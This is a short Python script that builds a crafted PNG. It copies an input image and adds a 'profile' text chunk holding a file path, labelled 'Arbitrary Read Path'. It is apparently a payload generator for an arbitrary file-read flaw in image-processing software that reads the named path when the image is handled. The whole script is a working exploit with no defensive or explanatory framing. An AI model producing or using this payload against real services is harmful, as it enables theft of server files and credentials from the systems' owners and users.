#!/usr/bin/env python3
import argparse
from PIL import Image
from PIL.PngImagePlugin import PngInfo


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('input', help='Input PNG')
    parser.add_argument('output', help='Output PNG')
    parser.add_argument('path', help='Arbitrary Read Path')
    args = parser.parse_args()

    img = Image.open(args.input)

    meta = PngInfo()
    meta.add_text('profile', args.path)

    img.save(args.output, pnginfo=meta)


if __name__ == '__main__':
    main()

